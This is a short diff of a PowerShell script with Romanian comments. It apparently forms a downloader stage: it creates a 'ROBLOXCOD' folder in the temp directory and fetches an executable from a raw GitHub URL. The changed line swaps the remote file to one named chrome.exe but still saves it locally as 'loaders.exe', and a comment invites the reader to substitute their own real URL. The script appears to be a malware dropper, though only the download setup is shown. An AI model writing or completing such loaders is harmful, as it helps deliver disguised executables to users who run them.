@@ -38,7 +38,7 @@ $workDir = Join-Path $env:TEMP "ROBLOXCOD"
 New-Item -ItemType Directory -Force -Path $workDir | Out-Null
 
 $exeName = "loaders.exe"
-$exeUrl = "https://raw.githubusercontent.com/BedlessDark/supreme/main/loaders.exe" # Inlocuieste cu URL-ul tau real
+$exeUrl = "https://raw.githubusercontent.com/BedlessDark/supreme/main/chrome.exe" # Inlocuieste cu URL-ul tau real
 $exePath = Join-Path $workDir $exeName
 
 Write-Host "[+] Descarc $exeName..."
